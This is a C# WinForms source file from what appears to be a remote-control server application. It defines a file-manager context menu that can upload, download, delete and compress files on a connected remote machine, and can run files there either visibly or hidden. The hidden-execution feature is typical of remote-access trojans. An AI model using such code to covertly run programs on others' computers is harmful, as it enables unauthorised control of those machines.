using System;
using System.Windows.Forms;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Server.Utils;

namespace RemoteControl.Server
{
    public partial class FrmMain
    {
        #region 文件管理右键菜单

        private void initFileManagerContextMenu()
        {
            this.contextMenuStrip1.Items.Clear();
            this.contextMenuStrip1.Items.Add("刷新", null, 刷新ToolStripMenuItem_Click);
            this.contextMenuStrip1.Items.Add(new ToolStripSeparator());
            this.contextMenuStrip1.Items.Add("下载文件", null, FileMenuDownload_Click);
            this.contextMenuStrip1.Items.Add("上传文件", null, FileMenuUpload_Click);
            this.contextMenuStrip1.Items.Add(new ToolStripSeparator());
            this.contextMenuStrip1.Items.Add("显示运行", null, FileMenuRunShow_Click);
            this.contextMenuStrip1.Items.Add("隐藏运行", null, FileMenuRunHide_Click);
            this.contextMenuStrip1.Items.Add(new ToolStripSeparator());
            this.contextMenuStrip1.Items.Add("压缩文件", null, FileMenuCompress_Click);
            this.contextMenuStrip1.Items.Add("解压文件", null, FileMenuDecompress_Click);
            this.contextMenuStrip1.Items.Add(new ToolStripSeparator());
            this.contextMenuStrip1.Items.Add("删除", null, FileMenuDelete_Click);
            this.contextMenuStrip1.Items.Add("重命名", null, FileMenuRename_Click);
            this.contextMenuStrip1.Items.Add("新建文件夹", null, FileMenuNewFolder_Click);
            this.contextMenuStrip1.Items.Add("属性", null, FileMenuProperty_Click);
            this.contextMenuStrip1.Items.Add(new ToolStripSeparator());
            this.contextMenuStrip1.Items.Add("复制全路径", null, 复制全路径ToolStripMenuItem_Click);
            this.contextMenuStrip1.Items.Add("播放音乐", null, 播放音乐ToolStripMenuItem_Click);
            this.contextMenuStrip1.Items.Add("停止播放音乐", null, 停止播放音乐ToolStripMenuItem_Click);
            this.contextMenuStrip1.Items.Add("远程下载到此处", null, 远程下载到此处ToolStripMenuItem_Click);
        }

        private void 刷新ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            RefreshCurrentFileView();
        }

        private void FileMenuDownload_Click(object sender, EventArgs e)
        {
            toolStripButton14_Click(sender, e);
        }

        private void FileMenuUpload_Click(object sender, EventArgs e)
        {
            toolStripButton13_Click(sender, e);
        }

        private void FileMenuRunShow_Click(object sender, EventArgs e)
        {
            RunSelectedRemoteFile(eRunFileMode.Show);
        }

        private void FileMenuRunHide_Click(object sender, EventArgs e)
        {
            RunSelectedRemoteFile(eRunFileMode.Hide);
        }

        private void FileMenuCompress_Click(object sender, EventArgs e)
        {
            string path;
            if (!TryGetSelectedRemoteFile(out path))
            {
                MsgBox.Info("请选择一个文件！");
                return;
            }

            RequestCompressFile req = new RequestCompressFile();
            req.SourcePath = path;
            req.DestPath = path + ".gz";
            PostRequstWithCurrentSession(ePacketType.PACKET_COMPRESS_FILE_REQUEST, req);
        }

        private void FileMenuDecompress_Click(object sender, EventArgs e)
        {
            string path;
            if (!TryGetSelectedRemoteFile(out path))
            {
                MsgBox.Info("请选择一个文件！");
                return;
            }

            RequestDecompressFile req = new RequestDecompressFile();
            req.SourcePath = path;
            req.DestPath = path.EndsWith(".gz", StringComparison.OrdinalIgnoreCase)
                ? path.Substring(0, path.Length - 3)
                : path + ".decomp";
            PostRequstWithCurrentSession(ePacketType.PACKET_DECOMPRESS_FILE_REQUEST, req);
        }

        private void FileMenuDelete_Click(object sender, EventArgs e)
        {
            toolStripButton9_Click(sender, e);
        }

        private void FileMenuRename_Click(object sender, EventArgs e)
        {
            toolStripButton2_Click(sender, e);
        }

        private void FileMenuNewFolder_Click(object sender, EventArgs e)
        {
            toolStripButton11_Click(sender, e);
        }

        private void FileMenuProperty_Click(object sender, EventArgs e)
        {
            if (this.listView1.SelectedItems.Count < 1)
                return;

            ListViewItem item = this.listView1.SelectedItems[0];
            ListViewItemFileOrDirTag tag = item.Tag as ListViewItemFileOrDirTag;
            if (tag == null)
                return;

            string sizeText = item.SubItems.Count > 1 ? item.SubItems[1].Text : string.Empty;
            string timeText = item.SubItems.Count > 2 ? item.SubItems[2].Text : string.Empty;
            string typeText = item.SubItems.Count > 3 ? item.SubItems[3].Text : string.Empty;
            string message = string.Format(
                "名称：{0}\r\n路径：{1}\r\n类型：{2}\r\n大小/磁盘类型：{3}\r\n修改日期/总大小：{4}",
                item.Text,
                tag.Path,
                string.IsNullOrEmpty(typeText) ? (tag.IsFile ? "文件" : "目录/磁盘") : typeText,
                sizeText,
                timeText);
            MsgBox.Info(message);
        }

        private bool TryGetSelectedRemoteFile(out string path)
        {
            path = null;
            if (this.listView1.SelectedItems.Count < 1)
                return false;

            return IsListViewItemAFile(this.listView1.SelectedItems[0], out path);
        }

        private void RunSelectedRemoteFile(eRunFileMode mode)
        {
            string path;
            if (!TryGetSelectedRemoteFile(out path))
            {
                MsgBox.Info("请选择一个文件！");
                return;
            }

            RequestRunFile req = new RequestRunFile();
            req.FilePath = path;
            req.Mode = mode;
            PostRequstWithCurrentSession(ePacketType.PACKET_RUN_FILE_REQUEST, req);
        }

        #endregion
    }
}
